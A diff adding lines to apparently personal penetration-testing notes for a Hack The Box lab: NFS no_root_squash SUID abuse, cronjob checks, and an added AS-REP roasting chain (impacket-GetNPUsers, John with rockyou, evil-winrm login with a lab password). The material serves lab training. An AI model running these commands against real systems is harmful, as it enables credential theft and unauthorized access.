@@ -121,6 +121,10 @@ Helpful resources
  - network mound, if no_root_sqash present `showmount -e victimsIP` `mount -o rw ip:/victimdir local_dir/` make file with suid bit set in local_dir change owner to root run in victims machine.
  - Check for any cronjob, that we can manipulate.
 
+
+`impacket-GetNPUsers htb.local/svc-alfresco --dc-ip 10.10.10.161 -no-pass
+john hash.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
 ### Windows
  - `whoami /priv` to see what priviliges you have.
  - See wierd folders and files.
